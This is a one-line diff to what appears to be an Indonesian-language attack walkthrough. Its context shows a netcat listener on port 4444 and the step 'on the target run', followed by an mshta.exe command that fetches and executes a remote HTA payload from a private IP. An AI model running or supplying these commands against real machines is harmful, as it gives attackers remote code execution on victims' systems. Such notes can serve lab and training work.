@@ -15,4 +15,5 @@ nc -lnvp 4444
 kemudian pada target jalankan
 ```
 mshta.exe http://172.26.74.9:8000/baka.hta
+
 ```
